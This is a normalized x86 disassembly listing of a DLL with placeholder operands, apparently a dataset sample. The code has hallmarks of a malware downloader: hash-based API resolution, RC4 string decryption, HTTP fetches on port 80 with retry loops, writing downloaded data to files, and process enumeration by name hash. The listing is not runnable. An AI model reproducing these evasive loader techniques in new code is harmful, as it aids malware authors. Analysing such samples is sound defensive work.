push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_100026a7
push ebp
mov ebp esp
push 0x36
push 0x58fe7abe
push 0x1
push 0x0
call sub_10001f02
add esp 0x10
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_100026c7
push ebp
mov ebp esp
push 0x1e5
push 0x1a212962
push 0x8
push 0x0
call sub_10001f02
add esp 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10002710
push ebp
mov ebp esp
push 0x1d9
push 0x2f5ce027
push 0x8
push 0x0
call sub_10001f02
add esp 0x10
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_1000273c
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x18 ] ebx
push 0x1d0
push 0x1510002f
push 0x8
push ebx
call sub_10001f02
add esp 0x10
push ebx
push ebx
push ebx
push ebx
push ebx
push rw-data
push rw-data
push [ ebp - 0xc ]
call eax
mov esi rw-data
push esi
mov [ ebp - 0x8 ] eax
call sub_10002bf3
push eax
push esi
push 0xffffffff
push rw-data
push [ ebp - 0x8 ]
call sub_1000267b
add esp 0x18
test eax eax
je r-xdata
mov edi rw-data
push edi
call sub_10002bf3
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call sub_100026f0
push [ ebp - 0xc ]
call sub_100026f0
push [ ebp - 0x20 ]
call sub_100026f0
add esp 0xc
cmp [ ebp - 0x14 ] ebx
ja r-xdata
push ebx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x20000005
push [ ebp - 0x8 ]
mov [ ebp - 0x24 ] 0x4
mov [ ebp - 0x4 ] ebx
call sub_10002710
add esp 0x14
mov esi eax
cmp [ rw-data ] bl
je r-xdata
push esi
call sub_10002bf3
push eax
push esi
push 0x2b
push [ ebp - 0xc ]
call sub_10002652
push edi
call sub_10002bf3
push eax
push edi
push 0x2c
push [ ebp - 0xc ]
call sub_10002652
add esp 0x28
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x4
push 0x2710
call sub_10001bf1
inc [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] 0x1e
jb r-xdata
push r--data
push rw-data
push rw-data
call sub_10002e4c
add esp 0xc
mov [ ebp - 0x1c ] eax
cmp esi ebx
je r-xdata
push rw-data
push 0x104
call sub_100026a7
pop ecx
pop ecx
push ebx
push ebx
push rw-data
push [ rw-data ]
mov [ ebp - 0x14 ] ebx
push rw-data
call sub_10002626
push 0x1ce
push 0xbe618d3e
push 0x8
push ebx
mov [ ebp - 0x20 ] eax
call sub_10001f02
add esp 0x24
push ebx
push ebx
push 0x3
push ebx
push ebx
push 0x50
push rw-data
push [ ebp - 0x20 ]
call eax
mov esi rw-data
push esi
mov [ ebp - 0xc ] eax
call sub_10002bf3
pop ecx
test eax eax
je r-xdata
push 0x1
push r--data
push eax
call sub_100032dd
add esp 0xc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x24
jbe r-xdata
push [ ebp - 0x4 ]
call sub_10002121
pop ecx
mov edi eax
xor esi esi
mov [ ebp - 0x10 ] ebx
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
push edi
call sub_10002139
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
push edi
push [ ebp - 0x1c ]
call sub_100032dd
add esp 0xc
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x4 ]
lea eax [ esi + edi ]
push eax
push [ ebp - 0x8 ]
call sub_100026c7
add esi [ ebp - 0x10 ]
add esp 0x10
cmp [ ebp - 0x10 ] ebx
je r-xdata
push [ ebp - 0x1c ]
call sub_10002139
pop ecx
sub_1000293c
push ebp
mov ebp esp
push ebx
push [ ebp + 0x3c ]
xor ebx ebx
push [ ebp + 0x38 ]
push [ ebp + 0x34 ]
push [ ebp + 0x30 ]
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1000224e
add esp 0x34
test al al
je r-xdata
mov al bl
pop ebx
pop ebp
retn
push ebx
push sub_1000273c
push [ ebp + 0x8 ]
call sub_1000210e
add esp 0xc
mov bl al
sub_1000298d
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x14 ] ebx
mov esi rw-data
push 0x1d0
push 0x1510002f
push 0x8
push ebx
call sub_10001f02
add esp 0x10
push ebx
push ebx
push ebx
push ebx
push ebx
push rw-data
push rw-data
push [ ebp - 0x8 ]
call eax
mov edi rw-data
push edi
mov [ ebp - 0x4 ] eax
call sub_10002bf3
push eax
push edi
push 0xffffffff
push rw-data
push [ ebp - 0x4 ]
call sub_1000267b
add esp 0x18
test eax eax
je r-xdata
mov edi rw-data
push edi
call sub_10002bf3
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_100026f0
push [ ebp - 0x8 ]
call sub_100026f0
push [ ebp - 0x18 ]
call sub_100026f0
add esp 0xc
cmp [ ebp - 0x10 ] ebx
ja r-xdata
push ebx
lea eax [ ebp - 0xc ]
push eax
push ebx
push 0x16
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] ebx
call sub_10002710
add esp 0x14
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push esi
call sub_10002bf3
push eax
push esi
push 0x2b
push [ ebp - 0x8 ]
call sub_10002652
push edi
call sub_10002bf3
push eax
push edi
push 0x2c
push [ ebp - 0x8 ]
call sub_10002652
add esp 0x28
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x4
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x1e
jb r-xdata
push [ ebp - 0xc ]
call sub_10002121
mov edi eax
push ebx
lea eax [ ebp - 0xc ]
push eax
push edi
push 0x13
push [ ebp - 0x4 ]
call sub_10002710
push 0x3
push r--data
push edi
call sub_100021f7
add esp 0x24
test eax eax
je r-xdata
push ebx
push ebx
push rw-data
push [ rw-data ]
mov [ ebp - 0x10 ] ebx
push rw-data
call sub_10002626
push 0x1ce
push 0xbe618d3e
push 0x8
push ebx
mov [ ebp - 0x18 ] eax
call sub_10001f02
add esp 0x24
push ebx
push ebx
push 0x3
push ebx
push ebx
push 0x50
push rw-data
push [ ebp - 0x18 ]
call eax
push esi
mov [ ebp - 0x8 ] eax
call sub_10002bf3
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x10 ] 0x1
push 0x3
push r--data
push edi
call sub_100021f7
add esp 0xc
mov [ ebp - 0x10 ] ebx
test eax eax
jne r-xdata
push r--data
push rw-data
push rw-data
call sub_10002e4c
add esp 0xc
mov edi eax
push 0x1
cmp [ ebp - 0x10 ] ebx
je r-xdata
push rw-data
push 0x104
call sub_100026a7
pop ecx
pop ecx
push edi
call sub_10002139
pop ecx
cmp [ rw-data ] bl
je r-xdata
push r--data
push r--data
jmp r-xdata
push edi
call sub_100032dd
add esp 0xc
push edi
mov [ ebp - 0x10 ] eax
call sub_10002139
pop ecx
sub_10002b82
push ebp
mov ebp esp
push ebx
push [ ebp + 0x3c ]
xor ebx ebx
push [ ebp + 0x38 ]
push [ ebp + 0x34 ]
push [ ebp + 0x30 ]
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1000243a
add esp 0x34
test al al
je r-xdata
mov al bl
pop ebx
pop ebp
retn
push ebx
push sub_1000298d
push [ ebp + 0x8 ]
call sub_1000210e
add esp 0xc
mov bl al
sub_10002bd3
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10002245
pop ecx
sub_10002bf3
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
cmp [ ecx ] 0x0
mov eax ecx
je r-xdata
xor eax eax
pop ebp
retn
sub eax ecx
pop ebp
retn
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_10002c12
push ebp
mov ebp esp
sub esp 0x10c
push ebx
push esi
push edi
xor ebx ebx
push 0xff
lea eax [ ebp - 0x10b ]
push ebx
push eax
mov [ ebp - 0x10c ] bl
call sub_10004195
push 0x34
mov [ ebp - 0x1 ] bl
call sub_10002121
push 0x32
push [ ebp + 0x10 ]
mov esi eax
push esi
call sub_100021aa
mov eax [ ebp + 0xc ]
add esp 0x1c
add eax [ ebp + 0x8 ]
mov cl [ eax - 0x2 ]
mov [ esi + 0x32 ] cl
mov al [ eax - 0x1 ]
mov [ esi + 0x33 ] al
movzx eax [ ebp - 0x1 ]
mov cl [ ebp - 0x1 ]
inc [ ebp - 0x1 ]
mov [ ebp + eax - 0x10c ] cl
jne r-xdata
xor edi edi
inc [ ebp - 0x1 ]
movzx edi al
lea eax [ ebp + edi - 0x10c ]
mov bl [ eax ]
mov [ ecx ] bl
mov [ eax ] dl
jne r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax [ ebp - 0x1 ]
lea ecx [ ebp + eax - 0x10c ]
cdq
push 0x34
pop ebx
idiv ebx
movzx eax [ edx + esi ]
mov dl [ ecx ]
movzx ebx dl
add eax edi
add eax ebx
and eax 0x800000ff
jns r-xdata
push esi
call sub_10002139
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
pop ecx
je r-xdata
lea eax [ esi - 0x1 ]
push eax
push esi
jmp r-xdata
movzx edx cl
lea esi [ ebp + edx - 0x10c ]
movzx ecx [ esi ]
add ecx edi
and ecx 0x800000ff
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
call sub_10002121
pop ecx
mov ecx [ ebp + 0x8 ]
sub ecx eax
xor edx edx
xor edi edi
add esi 0xfffffffe
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x8 ] esi
movzx edi cl
lea ecx [ ebp + edi - 0x10c ]
mov bl [ ecx ]
mov [ ebp + 0x17 ] bl
mov bl [ esi ]
mov [ ecx ] bl
mov bl [ ebp + 0x17 ]
mov [ esi ] bl
movzx ecx [ ecx ]
movzx esi bl
add esi ecx
and esi 0x800000ff
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
mov cl [ ebp + esi - 0x10c ]
mov esi [ ebp - 0xc ]
xor cl [ esi + eax ]
mov [ eax ] cl
inc eax
dec [ ebp + 0x8 ]
jne r-xdata
dec esi
or esi 0xffffff00
inc esi
lea ecx [ edx + 0x1 ]
and ecx 0x800000ff
jns r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ eax + ecx - 0x2 ] 0x0
pop ebx
leave
retn
sub_10002d73
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor eax eax
test edx edx
je r-xdata
pop ebp
retn
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
imul eax eax 0xa
movsx ecx cl
lea eax [ eax + ecx - 0x30 ]
inc edx
sub_10002d94
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl [ ebp + 0xc ]
je r-xdata
pop ebp
retn
inc eax
sub_10002db0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
je r-xdata
xor al al
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
push edx
call sub_10002bf3
push esi
mov edi eax
call sub_10002bf3
pop ecx
pop ecx
cmp edi eax
pop edi
jne r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
mov al 0x1
jmp r-xdata
mov eax edx
sub esi edx
pop esi
pop ebp
retn
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl [ esi + eax ]
jne r-xdata
sub_10002df7
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call sub_10002bf3
inc eax
push eax
call sub_10002121
push [ ebp + 0x8 ]
mov esi eax
call sub_10002bf3
push eax
push [ ebp + 0x8 ]
push esi
call sub_100021aa
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_10002e26
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
lea eax [ esi + 0x1 ]
push edi
push eax
call sub_10002121
push esi
push [ ebp + 0x8 ]
mov edi eax
push edi
call sub_100021aa
add esp 0x10
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_10002e4c
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_10002bf3
pop ecx
test eax eax
je r-xdata
pop esi
leave
retn
push ebx
push edi
xor ebx ebx
mov [ ebp - 0x4 ] 0x1
lea edi [ ebp + 0x8 ]
add edi 0x4
mov esi [ edi ]
push r--data
push esi
call sub_10002db0
pop ecx
pop ecx
test al al
je r-xdata
push esi
call sub_10002bf3
add eax [ ebp - 0x4 ]
push eax
push ebx
call sub_10002158
push esi
mov ebx eax
call sub_10002bf3
push eax
mov eax [ ebp - 0x4 ]
lea eax [ eax + ebx - 0x1 ]
push esi
push eax
call sub_100021aa
push esi
call sub_10002bf3
add esp 0x20
add [ ebp - 0x4 ] eax
test esi esi
je r-xdata
pop edi
mov eax ebx
pop ebx
sub_10002ee0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10002ec1
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10002245
pop ecx
sub_10002eff
push esi
push edi
mov esi ecx
xor edi edi
mov [ esi ] r--data
cmp [ esi + 0x8 ] edi
jbe r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
lea eax [ eax + edi * 4 ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
pop edi
mov ecx esi
pop esi
jmp sub_10002ec1
push eax
call sub_10002139
pop ecx
inc edi
cmp edi [ esi + 0x8 ]
jb r-xdata
push [ eax ]
call sub_10002139
pop ecx
sub_10002f48
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10002eff
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10002245
pop ecx
sub_10002f67
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
je r-xdata
xor al al
push edi
call sub_10002bf3
pop ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
push 0x4
call sub_10002121
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
lea eax [ eax * 4 + 0x4 ]
push eax
push ecx
call sub_10002158
pop ecx
jmp r-xdata
pop ecx
push edi
mov [ esi + 0x4 ] eax
call sub_10002bf3
inc eax
push eax
call sub_10002121
push edi
mov [ ebp + 0x8 ] eax
call sub_10002bf3
push eax
push edi
push [ ebp + 0x8 ]
call sub_10004144
mov ecx [ esi + 0x4 ]
push 0x4
lea eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x8 ]
lea eax [ ecx + eax * 4 ]
push eax
call sub_10004144
add esp 0x24
inc [ esi + 0x8 ]
mov al 0x1
jmp r-xdata
sub_10002ff1
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
movzx ecx [ edx ]
push edi
xor eax eax
xor edi edi
test cx cx
je r-xdata
or eax 0xffffffff
pop ebp
retn
pop edi
pop ebp
retn
push ebx
push esi
cmp [ ebp + 0x10 ] 0x0
movzx ecx cx
je r-xdata
cmp edi [ ebp + 0xc ]
jae r-xdata
movzx ecx cx
rol eax 0x7
add edx 0x2
xor eax ecx
movzx ecx [ edx ]
inc edi
test cx cx
jne r-xdata
lea ebx [ ecx - 0x41 ]
mov esi ecx
cmp bx 0x19
ja r-xdata
pop esi
pop ebx
cmp [ ebp + 0xc ] 0x0
je r-xdata
movzx ecx si
add ecx 0x20
movzx esi cx
sub_10003050
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
push esi
push edi
xor esi esi
xor edi edi
jmp r-xdata
or eax 0xffffffff
pop ebp
retn
mov cl [ edx ]
test cl cl
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp edi [ ebp + 0xc ]
jae r-xdata
movsx eax cl
rol esi 0x7
xor esi eax
inc edx
inc edi
lea eax [ ecx - 0x41 ]
cmp al 0x19
ja r-xdata
add cl 0x20
sub_10003098
push ebx
push esi
push edi
mov esi ecx
xor ebx ebx
xor edi edi
cmp [ esi + 0x8 ] ebx
jbe r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x4 ]
mov eax [ eax + edi * 4 ]
cmp [ eax ] ebx
je r-xdata
pop edi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
pop esi
mov al 0x1
pop ebx
retn
push eax
call sub_10002139
pop ecx
mov eax [ esi + 0x4 ]
lea eax [ eax + edi * 4 ]
cmp [ eax ] ebx
je r-xdata
push [ eax ]
call sub_10002139
pop ecx
inc edi
cmp edi [ esi + 0x8 ]
jb r-xdata
push [ eax ]
call sub_10002139
pop ecx
sub_100030ea
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
xor eax eax
mov [ ebp - 0x10 ] bl
lea edi [ ebp - 0xf ]
stosd [ edi ]
stosb [ edi ]
mov [ ebp - 0x18 ] bl
xor eax eax
lea edi [ ebp - 0x17 ]
stosd [ edi ]
push ebx
stosb [ edi ]
mov esi r--data
push esi
mov edi r--data
push edi
call sub_10002bf3
pop ecx
push eax
push edi
call sub_10002c12
add esp 0x10
push ebx
push esi
mov edi r--data
push edi
mov [ ebp - 0x8 ] eax
call sub_10002bf3
pop ecx
push eax
push edi
call sub_10002c12
mov edi eax
push 0x6
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
call sub_10001c07
push 0x6
lea eax [ ebp - 0x18 ]
push eax
push edi
call sub_10001c07
push [ ebp - 0x8 ]
call sub_10002139
push edi
call sub_10002139
add esp 0x30
push ebx
push esi
mov edi r--data
push edi
mov [ ebp - 0x1 ] bl
call sub_10002bf3
pop ecx
push eax
push edi
call sub_10002c12
add esp 0x10
push ebx
push esi
mov edi r--data
push edi
mov [ ebp - 0x8 ] eax
call sub_10002bf3
pop ecx
push eax
push edi
call sub_10002c12
add esp 0x10
push ebx
push esi
mov esi r--data
push esi
mov edi eax
call sub_10002bf3
pop ecx
push eax
push esi
call sub_10002c12
push [ ebp - 0x8 ]
mov esi eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10002db0
add esp 0x18
test al al
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_10002db0
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x8 ]
call sub_10002139
push edi
call sub_10002139
push esi
call sub_10002139
mov al [ ebp - 0x1 ]
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10002db0
pop ecx
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_10002db0
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x18 ]
push edi
push eax
call sub_10002db0
pop ecx
pop ecx
test al al
je r-xdata
sub_10003236
push ebp
mov ebp esp
push esi
push edi
mov esi 0x8000
xor eax eax
push 0x0
push esi
push edi
push [ ebp + 0x8 ]
call sub_10001e44
add esp 0x10
cmp eax 0xc0000004
jne r-xdata
test eax eax
jne r-xdata
push edi
call sub_10002139
pop ecx
add esi esi
jmp r-xdata
push edi
call sub_10002139
pop ecx
mov eax edi
jmp r-xdata
push esi
call sub_10002121
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
sub_10003295
push ebp
mov ebp esp
sub esp 0x140
and [ ebp - 0x140 ] 0x0
push 0x13c
lea eax [ ebp - 0x13c ]
push 0x0
push eax
call sub_10004195
add esp 0xc
lea eax [ ebp - 0x140 ]
push eax
push [ ebp + 0x8 ]
call sub_10001c59
cmp eax 0xffffffff
je r-xdata
xor al al
leave
retn
push eax
call sub_10001c8b
mov al 0x1
leave
retn
sub_100032dd
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push edi
push esi
push 0x80
push 0x2
push esi
push 0x1
push 0x40000000
push [ ebp + 0x8 ]
call sub_10001aee
mov edi eax
cmp edi 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
push edi
call sub_10001ad4
mov eax [ ebp + 0x8 ]
pop ecx
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
push esi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_10001b04
sub_1000333c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebx ] edi
cmp [ ebp + 0x8 ] edi
jne r-xdata
push edi
push edi
push 0x3
push edi
push edi
push 0x80000000
push [ ebp + 0x8 ]
call sub_10001aee
mov [ ebp + 0x8 ] eax
cmp eax 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
push esi
push edi
push eax
call sub_10001b72
mov esi eax
lea eax [ esi + 0x1 ]
push eax
call sub_10002121
pop ecx
mov [ ebp + 0xc ] eax
cmp eax edi
je r-xdata
pop edi
pop ebx
pop ebp
retn
push [ ebp + 0x8 ]
call sub_10001ad4
cmp esi [ ebx ]
pop ecx
pop esi
je r-xdata
cmp esi edi
je r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] edi
jmp r-xdata
push edi
push ebx
push esi
push eax
push [ ebp + 0x8 ]
call sub_10001b46
sub_100033b0
push esi
push edi
xor edi edi
mov esi rw-data
call sub_10001c47
push edi
mov [ esi ] eax
call sub_10001bf1
add esi 0x4
add edi 0x3
cmp esi rw-data
jl r-xdata
pop edi
pop esi
retn
sub_100033d7
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push ebx
push esi
push edi
lea esi [ eax * 4 + rw-data ]
mov ecx [ esi ]
lea edx [ eax - 0x3 ]
and edx 0xf
mov edi [ edx * 4 + rw-data ]
lea edx [ ecx + ecx ]
xor edx edi
shl edx 0xf
xor edx edi
xor edx ecx
lea ecx [ eax - 0x7 ]
and ecx 0xf
mov ecx [ ecx * 4 + rw-data ]
mov edi ecx
shr edi 0xb
xor ecx edi
mov edi edx
xor edi ecx
mov [ esi ] edi
mov esi edi
and esi 0xfed22169
shl esi 0x5
xor esi edi
shl ecx 0xa
dec eax
and eax 0xf
lea edi [ eax * 4 + rw-data ]
mov ebx [ edi ]
xor ecx edx
shl ecx 0x10
xor ecx ebx
shl ecx 0x2
xor ecx esi
mov [ rw-data ] eax
xor ecx edx
mov eax ecx
xor eax ebx
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
call sub_100033b0
sub_10003463
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp edi esi
jne r-xdata
jbe r-xdata
mov eax esi
jmp r-xdata
call sub_100033d7
sub esi edi
xor edx edx
div esi
lea eax [ edi + edx ]
call sub_100033d7
sub edi esi
xor edx edx
div edi
lea eax [ esi + edx ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_1000349a
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
push esi
movsx esi [ ebp + 0x14 ]
push edi
movsx edi [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
push esi
push edi
call sub_10003463
mov [ ebx ] al
pop ecx
inc ebx
dec [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop edi
pop esi
sub_100034cf
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x1 ]
push edi
push eax
call sub_10002121
push [ ebp + 0x10 ]
mov edi eax
push [ ebp + 0xc ]
push esi
push edi
call sub_1000349a
add esp 0x14
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_10003511
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
push 0x4
call sub_10002121
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea eax [ eax * 4 + 0x4 ]
push eax
push ecx
call sub_10002158
pop ecx
jmp r-xdata
mov [ esi + 0x4 ] eax
pop ecx
mov ecx [ esi + 0x4 ]
push 0x4
lea eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x8 ]
lea eax [ ecx + eax * 4 ]
push eax
call sub_100021aa
add esp 0xc
inc [ esi + 0x8 ]
mov al 0x1
pop esi
pop ebp
retn 0x4
sub_10003563
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
call sub_100030ea
test al al
je r-xdata
xor al al
leave
retn
push ebx
push esi
push edi
push 0x1
call sub_1000100c
push 0xc
mov esi eax
call sub_10001194
push esi
mov edi eax
call sub_100018f3
push edi
push eax
call sub_10001f34
push esi
mov ebx eax
call sub_10002139
push edi
call sub_10002139
xor esi esi
add esp 0x1c
cmp ebx esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
call ebx
test al al
jne r-xdata
xor al al
jmp r-xdata
xor eax eax
cmp [ ebp - 0x4 ] esi
sete al
mov [ ebp - 0x4 ] esi
pop edi
pop esi
pop ebx
leave
retn
sub_100035d7
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
push 0x5
call sub_10003236
mov esi eax
xor edi edi
pop ecx
mov [ ebp - 0x8 ] esi
cmp esi edi
je r-xdata
push [ ebp - 0x8 ]
call sub_10002139
pop ecx
mov eax edi
pop edi
pop esi
leave
retn
call sub_10003283
mov [ ebp - 0x4 ] eax
cmp [ esi ] edi
jne r-xdata
cmp [ esi + 0x38 ] di
je r-xdata
add esi [ esi ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x50 ]
jne r-xdata
jmp r-xdata
push 0x1
push edi
push [ esi + 0x3c ]
call sub_10002ff1
add esp 0xc
cmp eax [ ebp + 0x8 ]
je r-xdata
mov edi [ esi + 0x44 ]
sub_10003634
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
push esi
mov esi [ ebx + 0x8 ]
test esi esi
je r-xdata
pop esi
push edi
xor edi edi
test esi esi
je r-xdata
pop edi
push edi
mov ecx ebx
call sub_100034f8
push eax
call sub_10003295
pop ecx
test al al
je r-xdata
inc edi
cmp edi esi
jb r-xdata
push edi
mov ecx ebx
call sub_100034f8
push eax
call sub_10001b5c
sub_10003679
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0x8 ]
push 0x0
push 0x400
call sub_10001c27
mov esi eax
push esi
call sub_10003563
push esi
mov bl al
call sub_10001ad4
add esp 0x14
pop esi
mov al bl
pop ebx
pop ebp
retn
sub_100036a6
push ebp
mov ebp esp
sub esp 0xc
push esi
push 0xc
call sub_10002121
push 0x5
mov [ ebp - 0x4 ] eax
call sub_10003236
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0xc ] esi
test esi esi
je r-xdata
push [ ebp - 0xc ]
call sub_10002139
mov eax [ ebp - 0x4 ]
pop ecx
pop esi
leave
retn
call sub_10003283
push ebx
mov [ ebp - 0x8 ] eax
push edi
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
add esi [ esi ]
mov eax [ ebp - 0x8 ]
cmp eax [ esi + 0x50 ]
jne r-xdata
pop edi
pop ebx
push 0x10
call sub_100046cb
mov edi eax
movzx eax [ esi + 0x38 ]
add eax 0x2
push eax
call sub_10002121
mov ebx eax
movzx eax [ esi + 0x38 ]
push eax
push [ esi + 0x3c ]
push ebx
call sub_10004144
mov [ edi ] ebx
mov eax [ esi + 0x44 ]
mov [ edi + 0x4 ] eax
mov eax [ esi + 0x48 ]
push [ edi + 0x4 ]
mov [ edi + 0x8 ] eax
call sub_10003679
mov ecx [ ebp - 0x4 ]
add esp 0x18
test al al
setne al
push edi
mov [ edi + 0xc ] al
call sub_10003511
push 0x1
push 0x0
push [ esi + 0x3c ]
call sub_10002ff1
add esp 0xc
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub_10003761
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
push esi
